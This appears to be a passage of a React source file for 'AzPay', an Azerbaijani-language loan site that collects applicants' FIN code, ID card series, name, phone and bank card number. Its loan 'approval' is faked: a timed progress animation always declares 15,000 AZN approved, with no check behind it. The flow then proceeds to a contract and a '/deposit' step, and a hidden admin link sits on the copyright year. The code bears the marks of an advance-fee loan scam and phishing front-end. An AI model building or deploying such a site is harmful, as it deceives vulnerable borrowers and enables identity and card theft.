import React, { useState, useEffect } from 'react';
import { BrowserRouter, Routes, Route, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '@/App.css';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { CheckCircle2, Shield, Clock, TrendingUp, Loader2 } from 'lucide-react';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Home Page
const HomePage = () => {
  const navigate = useNavigate();
  const [settings, setSettings] = useState(null);

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        const response = await axios.get(`${API}/settings`);
        setSettings(response.data);
      } catch (error) {
        console.error('Settings yüklənə bilmədi');
      }
    };
    fetchSettings();
  }, []);

  return (
    <div className="min-h-screen">
      {/* Header */}
      <header className="sticky top-0 z-50 backdrop-blur-xl bg-white/80 border-b border-blue-100 shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-3">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-10 sm:h-12 w-auto cursor-pointer"
                onClick={() => navigate('/')}
              />
            </div>
            
            {/* Mobile & Desktop Navigation - Always Visible */}
            <nav className="flex items-center gap-2 sm:gap-6">
              <button 
                onClick={() => navigate('/')}
                className="text-gray-700 hover:text-blue-600 font-medium transition-colors text-xs sm:text-base"
              >
                Ana
              </button>
              <button 
                onClick={() => {
                  const aboutSection = document.querySelector('.about-section');
                  aboutSection?.scrollIntoView({ behavior: 'smooth' });
                }}
                className="text-gray-700 hover:text-blue-600 font-medium transition-colors text-xs sm:text-base"
              >
                Haqqımızda
              </button>
              <button 
                onClick={() => {
                  const featuresSection = document.querySelector('.features-section');
                  featuresSection?.scrollIntoView({ behavior: 'smooth' });
                }}
                className="text-gray-700 hover:text-blue-600 font-medium transition-colors text-xs sm:text-base"
              >
                Üstünlük
              </button>
            </nav>

            <Button 
              onClick={() => navigate('/application')} 
              className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 px-3 sm:px-8 text-xs sm:text-base py-2 sm:py-3"
              data-testid="start-application-btn"
            >
              Müraciət
            </Button>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative py-12 sm:py-24 px-4 overflow-hidden min-h-[500px] sm:min-h-[600px] flex items-center">
        <div className="absolute inset-0 bg-gradient-to-br from-blue-100 via-blue-50 to-white"></div>
        <div className="absolute inset-0 opacity-10">
          <div className="absolute top-20 left-10 w-72 h-72 bg-blue-400 rounded-full blur-3xl"></div>
          <div className="absolute bottom-20 right-10 w-96 h-96 bg-blue-300 rounded-full blur-3xl"></div>
        </div>
        <div className="container mx-auto relative z-10">
          <div className="max-w-5xl mx-auto text-center">
            <div className="mb-6 sm:mb-8 flex items-center justify-center gap-3 sm:gap-4">
              <div className="animate-bounce">
                <img 
                  src="https://i.hizliresim.com/iydskgy.jpeg" 
                  alt="AzPay" 
                  className="h-12 sm:h-20 w-auto"
                />
              </div>
              <div className="animate-bounce" style={{animationDelay: '0.2s'}}>
                <div className="inline-block p-2 sm:p-3 bg-gradient-to-br from-blue-600 to-blue-700 rounded-xl sm:rounded-2xl shadow-xl">
                  <span className="text-3xl sm:text-5xl font-bold text-white">₼</span>
                </div>
              </div>
            </div>
            <h1 className="text-3xl sm:text-5xl lg:text-7xl font-extrabold mb-4 sm:mb-6 bg-gradient-to-r from-blue-800 via-blue-600 to-blue-500 bg-clip-text text-transparent leading-tight px-2">
              Kredit almaq indi<br/>daha asan və sürətli!
            </h1>
            <p className="text-lg sm:text-xl lg:text-2xl text-gray-700 mb-3 sm:mb-4 max-w-3xl mx-auto font-medium px-4">
              15 dəqiqə ərzində 15,000 AZN-dək kredit
            </p>
            <p className="text-sm sm:text-lg text-gray-600 mb-8 sm:mb-10 max-w-2xl mx-auto px-4">
              Rəsmi gəlir arayışı tələb olunmur • Gecikməsi olanlar üçün kredit
            </p>
            <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 justify-center items-center px-4">
              <Button 
                onClick={() => navigate('/application')} 
                size="lg"
                className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-base sm:text-xl px-8 sm:px-12 py-5 sm:py-7 rounded-full shadow-2xl hover:shadow-xl transition-all hover:scale-105 font-bold w-full sm:w-auto"
                data-testid="hero-apply-btn"
              >
                Dərhal müraciət et →
              </Button>
              <div className="flex items-center gap-2 text-gray-700 text-sm sm:text-base">
                <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-green-600 flex-shrink-0" />
                <span className="font-semibold">5,000+ təsdiqlənmiş müraciət</span>
              </div>
            </div>
            
            <div className="mt-8 sm:mt-12 grid grid-cols-3 gap-3 sm:gap-8 max-w-2xl mx-auto px-2">
              <div className="bg-white/80 backdrop-blur-sm p-3 sm:p-6 rounded-xl sm:rounded-2xl shadow-lg">
                <div className="text-xl sm:text-3xl font-bold text-blue-700">15 dəq</div>
                <div className="text-xs sm:text-sm text-gray-600 mt-1">Sürətli cavab</div>
              </div>
              <div className="bg-white/80 backdrop-blur-sm p-3 sm:p-6 rounded-xl sm:rounded-2xl shadow-lg">
                <div className="text-xl sm:text-3xl font-bold text-blue-700">10%</div>
                <div className="text-xs sm:text-sm text-gray-600 mt-1">İllik faiz</div>
              </div>
              <div className="bg-white/80 backdrop-blur-sm p-3 sm:p-6 rounded-xl sm:rounded-2xl shadow-lg">
                <div className="text-lg sm:text-3xl font-bold text-blue-700">15,000₼</div>
                <div className="text-xs sm:text-sm text-gray-600 mt-1">Maks kredit</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="features-section py-12 sm:py-20 px-4">
        <div className="container mx-auto">
          <div className="grid sm:grid-cols-2 md:grid-cols-3 gap-4 sm:gap-8">
            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <Clock className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Sürətli baxış</CardTitle>
                <CardDescription>Müraciətiniz dərhal yoxlanılır və cavab alırsınız</CardDescription>
              </CardHeader>
            </Card>

            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <Shield className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Asan şərtlər</CardTitle>
                <CardDescription>Rəsmi gəlir arayışı tələb olunmur, gecikmə olanlar müraciət edə bilər</CardDescription>
              </CardHeader>
            </Card>

            <Card className="border-blue-100 hover:shadow-xl transition-all hover:-translate-y-1">
              <CardHeader>
                <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center mb-4">
                  <TrendingUp className="w-7 h-7 text-white" />
                </div>
                <CardTitle>Əlverişli faizlər</CardTitle>
                <CardDescription>10% illik faiz dərəcəsi ilə kredit imkanı</CardDescription>
              </CardHeader>
            </Card>
          </div>
        </div>
      </section>

      {/* About AzPay */}
      <section className="about-section py-12 sm:py-20 px-4 bg-gradient-to-br from-blue-50 to-white">
        <div className="container mx-auto max-w-4xl">
          <h2 className="text-2xl sm:text-4xl font-bold text-center mb-8 sm:mb-12 text-blue-900">AzPay haqqında</h2>
          <Card className="border-blue-100 shadow-xl">
            <CardContent className="p-4 sm:p-8">
              <p className="text-sm sm:text-lg text-gray-700 leading-relaxed mb-4">
                <strong className="text-blue-700">AzPay</strong> - Azərbaycanda rəqəmsal maliyyə xidmətləri sahəsində fəaliyyət göstərən innovativ şirkətdir. 
                Biz müştərilərimizə ən sürətli və asan kredit xidmətlərini təqdim edirik.
              </p>
              <p className="text-lg text-gray-700 leading-relaxed mb-4">
                Missiyamız hər kəsə maliyyə imkanlarına əlçatanlığı təmin etməkdir. Rəsmi gəlir arayışı olmayan, 
                kredit tarixində gecikmələr olan şəxslər belə bizdən kredit ala bilərlər.
              </p>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mt-4 sm:mt-6">
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Sürətli proses</h4>
                    <p className="text-sm text-gray-600">15 dəqiqə ərzində cavab</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Minimum sənəd</h4>
                    <p className="text-sm text-gray-600">Yalnız şəxsiyyət vəsiqəsi</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Şəffaflıq</h4>
                    <p className="text-sm text-gray-600">Aydın şərtlər</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle2 className="w-6 h-6 text-blue-600 mt-1 flex-shrink-0" />
                  <div>
                    <h4 className="font-semibold text-gray-900">Təhlükəsizlik</h4>
                    <p className="text-sm text-gray-600">Məlumatlarınız qorunur</p>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gradient-to-r from-blue-900 to-blue-800 text-white py-12 px-4">
        <div className="container mx-auto">
          <div className="grid md:grid-cols-3 gap-8 mb-8">
            {/* Logo and About */}
            <div className="text-center md:text-left">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-14 w-auto mx-auto md:mx-0 mb-4"
              />
              <p className="text-blue-100 text-sm leading-relaxed">
                {settings?.about_text || 'AzPay - Azərbaycanda rəqəmsal maliyyə xidmətləri sahəsində fəaliyyət göstərən innovativ şirkətdir.'}
              </p>
            </div>

            {/* Contact Info */}
            <div className="text-center md:text-left">
              <h3 className="text-xl font-bold mb-4">Əlaqə</h3>
              <div className="space-y-3 text-blue-100">
                <div className="flex items-center justify-center md:justify-start gap-2">
                  <span className="text-lg">📞</span>
                  <span className="text-sm">{settings?.contact_phone || '+994 50 123 45 67'}</span>
                </div>
                <div className="flex items-center justify-center md:justify-start gap-2">
                  <span className="text-lg">✉️</span>
                  <span className="text-sm">{settings?.contact_email || 'info@azpay.az'}</span>
                </div>
                <div className="flex items-center justify-center md:justify-start gap-2">
                  <span className="text-lg">📍</span>
                  <span className="text-sm">{settings?.contact_address || 'Bakı, Azərbaycan'}</span>
                </div>
              </div>
            </div>

            {/* Quick Links */}
            <div className="text-center md:text-left">
              <h3 className="text-xl font-bold mb-4">Sürətli keçidlər</h3>
              <div className="space-y-2">
                <div>
                  <button 
                    onClick={() => navigate('/application')}
                    className="text-blue-100 hover:text-white transition-colors text-sm"
                  >
                    Müraciət et
                  </button>
                </div>
                <div>
                  <button 
                    onClick={() => {
                      const aboutSection = document.querySelector('.about-section');
                      aboutSection?.scrollIntoView({ behavior: 'smooth' });
                    }}
                    className="text-blue-100 hover:text-white transition-colors text-sm"
                  >
                    Haqqımızda
                  </button>
                </div>
              </div>
            </div>
          </div>

          <div className="border-t border-blue-700 pt-6 text-center">
            <p className="text-blue-100">
              © <span onClick={() => navigate('/admin')} className="cursor-pointer hover:text-white transition-colors">2025</span> AzPay. Bütün hüquqlar qorunur.
            </p>
          </div>
        </div>
      </footer>
    </div>
  );
};

// Application Form
const ApplicationForm = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    fin_code: '',
    id_series: '',
    full_name: '',
    phone: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const response = await axios.post(`${API}/applications`, formData);
      toast.success('Müraciətiniz qəbul edildi!');
      setTimeout(() => {
        navigate(`/approval/${response.data.id}`);
      }, 1500);
    } catch (error) {
      toast.error('Xəta baş verdi. Yenidən cəhd edin.');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-2xl">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/')} 
          className="mb-6"
          data-testid="back-to-home-btn"
        >
          ← Geri
        </Button>

        <Card className="shadow-2xl border-blue-100">
          <CardHeader className="space-y-1 pb-6">
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-12 w-auto mx-auto mb-4"
            />
            <CardTitle className="text-3xl text-center">Kredit müraciəti</CardTitle>
            <CardDescription className="text-center">
              Məlumatlarınızı daxil edərək müraciət edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="fin_code">FIN kod</Label>
                <Input
                  id="fin_code"
                  data-testid="fin-code-input"
                  placeholder="7 simvol"
                  value={formData.fin_code}
                  onChange={(e) => setFormData({ ...formData, fin_code: e.target.value.toUpperCase() })}
                  maxLength={7}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="id_series">Şəxsiyyət vəsiqəsi seriya və nömrəsi</Label>
                <Input
                  id="id_series"
                  data-testid="id-series-input"
                  placeholder="Seriya və nömrə"
                  value={formData.id_series}
                  onChange={(e) => setFormData({ ...formData, id_series: e.target.value.toUpperCase() })}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="full_name">Ad və Soyad</Label>
                <Input
                  id="full_name"
                  data-testid="full-name-input"
                  placeholder="Ad və soyad"
                  value={formData.full_name}
                  onChange={(e) => setFormData({ ...formData, full_name: e.target.value })}
                  required
                  className="mt-1.5"
                />
              </div>

              <div>
                <Label htmlFor="phone">Telefon nömrəsi</Label>
                <Input
                  id="phone"
                  data-testid="phone-input"
                  type="tel"
                  placeholder="+994"
                  value={formData.phone}
                  onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                  required
                  className="mt-1.5"
                />
              </div>

              <Button 
                type="submit" 
                className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
                disabled={loading}
                data-testid="submit-application-btn"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Yoxlanılır...
                  </>
                ) : (
                  'Yoxla və davam et'
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Approval Page
const ApprovalPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [progress, setProgress] = useState(0);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    // Progress animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) return 100;
        return prev + (100 / 15);
      });
    }, 1000);

    // Show approval message after 15 seconds
    const approvalTimeout = setTimeout(() => {
      setChecking(false);
    }, 15000);

    // Navigate after 18 seconds (3 seconds to show approval)
    const navigateTimeout = setTimeout(() => {
      navigate(`/credit-selection/${appId}`);
    }, 18000);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(approvalTimeout);
      clearTimeout(navigateTimeout);
    };
  }, [navigate, appId]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 flex items-center justify-center px-4">
      <Card className="max-w-md w-full shadow-2xl border-blue-100">
        <CardContent className="p-12 text-center">
          {checking ? (
            <>
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-16 w-auto mx-auto mb-8"
              />
              <div className="relative w-40 h-40 mx-auto mb-8">
                {/* Outer spinning ring */}
                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-green-500 border-r-green-400 animate-spin"></div>
                {/* Inner spinning ring */}
                <div className="absolute inset-3 rounded-full border-4 border-transparent border-b-blue-500 border-l-blue-400 animate-spin" style={{animationDirection: 'reverse', animationDuration: '1.5s'}}></div>
                {/* Center circle with gradient */}
                <div className="absolute inset-6 rounded-full bg-gradient-to-br from-green-400 to-blue-500 flex items-center justify-center shadow-lg">
                  <span className="text-4xl font-bold text-white">✓</span>
                </div>
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3">
                Yoxlanış aparılır...
              </h2>
              <p className="text-gray-600 text-lg mb-6">
                Məlumatlarınız təhlil edilir
              </p>
              
              <div className="space-y-3">
                <div className="w-full bg-gray-200 rounded-full h-3 overflow-hidden shadow-inner">
                  <div 
                    className="bg-gradient-to-r from-green-500 via-blue-500 to-green-500 h-3 rounded-full transition-all duration-1000 shadow-lg"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
                <p className="text-sm text-gray-500 font-semibold">
                  {Math.round(progress)}% tamamlandı
                </p>
              </div>
            </>
          ) : (
            <>
              <div className="w-24 h-24 bg-gradient-to-br from-green-400 to-green-500 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
                <CheckCircle2 className="w-14 h-14 text-white" />
              </div>
              <h2 className="text-3xl font-bold text-gray-900 mb-3" data-testid="approval-title">
                15,000 AZN kredit təsdiq edildi!
              </h2>
              <p className="text-gray-600 text-lg">
                Təbrik edirik! Kredit məbləğinizi seçə bilərsiniz.
              </p>
            </>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

// Credit Selection Page
const CreditSelectionPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [offers, setOffers] = useState([]);
  const [selectedOffer, setSelectedOffer] = useState(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetchOffers();
  }, []);

  const fetchOffers = async () => {
    try {
      const response = await axios.get(`${API}/credit-offers`);
      setOffers(response.data);
    } catch (error) {
      toast.error('Təklifləri yükləyərkən xəta baş verdi');
    }
  };

  const handleSelectOffer = async (offer) => {
    setLoading(true);
    try {
      await axios.put(`${API}/applications/${appId}`, {
        selected_amount: offer.amount
      });
      toast.success('Kredit məbləği seçildi');
      setTimeout(() => {
        navigate(`/card-entry/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-4xl">
        <Card className="shadow-2xl border-blue-100 mb-8">
          <CardHeader>
            <div className="text-center mb-4">
              <img 
                src="https://i.hizliresim.com/iydskgy.jpeg" 
                alt="AzPay" 
                className="h-16 w-auto mx-auto"
              />
            </div>
            <CardTitle className="text-3xl text-center">Kredit məbləği seçin</CardTitle>
            <CardDescription className="text-center">
              Sizə uyğun məbləği seçərək davam edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-6">
              {offers.map((offer) => (
                <Card 
                  key={offer.amount}
                  className={`cursor-pointer border-2 transition-all duration-300 hover:shadow-2xl hover:-translate-y-1 ${
                    selectedOffer?.amount === offer.amount 
                      ? 'border-blue-600 bg-gradient-to-br from-blue-50 to-blue-100 shadow-xl scale-105' 
                      : 'border-gray-200 hover:border-blue-400'
                  }`}
                  onClick={() => setSelectedOffer(offer)}
                  data-testid={`credit-offer-${offer.amount}`}
                >
                  <CardContent className="p-3 sm:p-6">
                    <div className="text-center mb-2 sm:mb-4 relative">
                      {selectedOffer?.amount === offer.amount && (
                        <div className="absolute -top-1 -right-1 sm:-top-2 sm:-right-2">
                          <CheckCircle2 className="w-4 h-4 sm:w-6 sm:h-6 text-blue-600" />
                        </div>
                      )}
                      <div className="inline-block px-2 py-1 sm:px-4 sm:py-2 bg-gradient-to-r from-blue-600 to-blue-700 rounded-full mb-2 sm:mb-3">
                        <h3 className="text-lg sm:text-3xl font-bold text-white">{offer.amount} ₼</h3>
                      </div>
                    </div>
                    <div className="space-y-1.5 sm:space-y-3 text-xs sm:text-sm">
                      <div className="flex justify-between items-center p-1.5 sm:p-2 bg-white rounded-lg">
                        <span className="text-gray-600">Müddət:</span>
                        <span className="font-semibold text-gray-900">{offer.duration_months} ay</span>
                      </div>
                      <div className="flex justify-between items-center p-1.5 sm:p-2 bg-white rounded-lg">
                        <span className="text-gray-600">Faiz:</span>
                        <span className="font-semibold text-gray-900">{offer.interest_rate}%</span>
                      </div>
                      <div className="flex justify-between items-center p-2 sm:p-3 bg-gradient-to-r from-blue-100 to-blue-50 rounded-lg border border-blue-200">
                        <span className="text-gray-700 font-medium text-xs sm:text-sm">Aylıq:</span>
                        <span className="font-bold text-blue-700 text-sm sm:text-lg">{offer.monthly_payment.toFixed(2)} ₼</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            <Button
              onClick={() => handleSelectOffer(selectedOffer)}
              disabled={!selectedOffer || loading}
              className="w-full mt-8 bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
              data-testid="confirm-credit-selection-btn"
            >
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                  Yüklənir...
                </>
              ) : (
                'Davam et'
              )}
            </Button>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Card Entry Page
const CardEntryPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [cardNumber, setCardNumber] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await axios.put(`${API}/applications/${appId}`, {
        card_number: cardNumber
      });
      toast.success('Kart məlumatı yadda saxlanıldı');
      setTimeout(() => {
        navigate(`/contract/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned;
    return formatted;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-12 px-4">
      <div className="container mx-auto max-w-xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader>
            <img 
              src="https://i.hizliresim.com/iydskgy.jpeg" 
              alt="AzPay" 
              className="h-14 w-auto mx-auto mb-4"
            />
            <CardTitle className="text-3xl text-center">Kart məlumatları</CardTitle>
            <CardDescription className="text-center">
              Pulun köçürüləcəyi kart nömrəsini daxil edin
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <Label htmlFor="card_number">Kart nömrəsi (16 rəqəm)</Label>
                <Input
                  id="card_number"
                  data-testid="card-number-input"
                  type="text"
                  placeholder="0000 0000 0000 0000"
                  value={formatCardNumber(cardNumber)}
                  onChange={(e) => {
                    const cleaned = e.target.value.replace(/\s/g, '');
                    if (/^\d{0,16}$/.test(cleaned)) {
                      setCardNumber(cleaned);
                    }
                  }}
                  maxLength={19}
                  required
                  className="mt-1.5 text-lg tracking-wider"
                />
              </div>

              <Button
                type="submit"
                disabled={cardNumber.length !== 16 || loading}
                className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 py-6 text-lg"
                data-testid="submit-card-btn"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Yüklənir...
                  </>
                ) : (
                  'Rəsmiləşdirməyə keç'
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

// Contract Page
const ContractPage = () => {
  const navigate = useNavigate();
  const appId = window.location.pathname.split('/').pop();
  const [accepted, setAccepted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [application, setApplication] = useState(null);
  const [selectedOffer, setSelectedOffer] = useState(null);

  useEffect(() => {
    const fetchApplicationData = async () => {
      try {
        const appResponse = await axios.get(`${API}/applications/${appId}`);
        setApplication(appResponse.data);
        
        const offersResponse = await axios.get(`${API}/credit-offers`);
        const offer = offersResponse.data.find(o => o.amount === appResponse.data.selected_amount);
        setSelectedOffer(offer);
      } catch (error) {
        console.error('Məlumatlar yüklənə bilmədi');
      }
    };
    fetchApplicationData();
  }, [appId]);

  const handleAccept = async () => {
    setLoading(true);
    try {
      await axios.put(`${API}/applications/${appId}`, {
        contract_signed: true
      });
      toast.success('Müqavilə təsdiqləndi');
      setTimeout(() => {
        navigate(`/deposit/${appId}`);
      }, 1000);
    } catch (error) {
      toast.error('Xəta baş verdi');
      setLoading(false);
    }
  };

  const totalPayment = selectedOffer ? (selectedOffer.monthly_payment * selectedOffer.duration_months).toFixed(2) : 0;
  const interestAmount = selectedOffer ? (totalPayment - selectedOffer.amount).toFixed(2) : 0;

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-blue-50 py-6 sm:py-12 px-4">
      <div className="container mx-auto max-w-4xl">
        <Card className="shadow-2xl border-blue-100">
          <CardHeader className="bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-t-lg py-8">
            <div className="flex justify-center mb-6">
              <div className="bg-white p-4 rounded-xl shadow-lg">
                <img 
                  src="https://i.hizliresim.com/iydskgy.jpeg" 
                  alt="AzPay" 
                  className="h-20 w-auto"
                />
              </div>
            </div>
            <CardTitle className="text-2xl sm:text-3xl text-center font-bold">Kredit Müqaviləsi</CardTitle>
            <CardDescription className="text-center text-blue-100 text-xl mt-3 font-semibold">
              №{appId.substring(0, 8).toUpperCase()}
            </CardDescription>
          </CardHeader>
          <CardContent className="p-4 sm:p-6">
            {/* Contract Info Summary */}
            <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-3 sm:p-6 rounded-xl mb-4 sm:mb-6 border-2 border-blue-200">
              <h3 className="font-bold text-base sm:text-xl text-blue-800 mb-3 sm:mb-4 text-center">Müqavilə Məlumatları</h3>
              <div className="grid grid-cols-2 gap-2 sm:gap-4 text-xs sm:text-base">
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Kreditor</p>
                  <p className="font-bold text-blue-700 text-xs sm:text-base">AzPay</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Borc alan</p>
                  <p className="font-bold text-gray-900 text-xs sm:text-base truncate">{application?.full_name || 'Yüklənir...'}</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Məbləğ</p>
                  <p className="font-bold text-blue-700 text-sm sm:text-xl">{selectedOffer?.amount || 0} ₼</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Müddət</p>
                  <p className="font-bold text-gray-900 text-xs sm:text-base">{selectedOffer?.duration_months || 0} ay</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Aylıq</p>
                  <p className="font-bold text-green-600 text-sm sm:text-xl">{selectedOffer?.monthly_payment || 0} ₼</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Faiz</p>
                  <p className="font-bold text-gray-900 text-xs sm:text-base">{selectedOffer?.interest_rate || 0}%</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Cəmi</p>
                  <p className="font-bold text-gray-900 text-xs sm:text-base">{totalPayment} ₼</p>
                </div>
                <div className="bg-white p-2 sm:p-3 rounded-lg">
                  <p className="text-gray-600 text-xs">Faiz məbləği</p>
                  <p className="font-bold text-gray-900 text-xs sm:text-base">{interestAmount} ₼</p>
                </div>
              </div>
            </div>

            {/* Contract Terms */}
            <div className="bg-gray-50 p-3 sm:p-6 rounded-lg max-h-64 sm:max-h-96 overflow-y-auto mb-4 sm:mb-6 border border-gray-200" data-testid="contract-content">
              <div className="text-center mb-4">
                <img 
                  src="https://i.hizliresim.com/iydskgy.jpeg" 
                  alt="AzPay" 
                  className="h-12 w-auto mx-auto mb-2"
                />
              </div>
              <h3 className="font-bold text-base sm:text-lg mb-4 text-blue-700 text-center">Kredit müqaviləsi şərtləri</h3>
              
              <div className="space-y-4 text-xs sm:text-sm text-gray-700 leading-relaxed">
                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">1. Tərəflər</h4>
                  <p><strong>Kreditor:</strong> AzPay MMC (bundan sonra "Kreditor")</p>
                  <p><strong>Borc alan:</strong> {application?.full_name || '...'} (bundan sonra "Borc alan")</p>
                  <p><strong>FIN kod:</strong> {application?.fin_code || '...'}</p>
                  <p><strong>Şəxsiyyət vəsiqəsi:</strong> {application?.id_series || '...'}</p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">2. Kreditin məbləği və şərtləri</h4>
                  <p>Kreditor Borc alana <strong className="text-blue-700">{selectedOffer?.amount || 0} AZN</strong> məbləğində kredit verir.</p>
                  <p>Müddət: <strong>{selectedOffer?.duration_months || 0} ay</strong></p>
                  <p>İllik faiz dərəcəsi: <strong>{selectedOffer?.interest_rate || 0}%</strong></p>
                  <p>Aylıq ödəniş: <strong className="text-green-600">{selectedOffer?.monthly_payment || 0} AZN</strong></p>
                  <p>Cəmi ödəniş: <strong>{totalPayment} AZN</strong></p>
                </section>

                <section>
                  <h4 className="font-semibold mb-2 text-gray-900">3. Ödəniş qaydası</h4>
                  <p>Borc alan hər ay {selectedOffer?.monthly_payment || 0} AZN məbləğində ödəniş etməlidir. Ödənişlər <strong>{application?.card_number ? `****${application.card_number.slice(-4)}` : '...'}</strong> nömrəli karta köçürülür.</p>
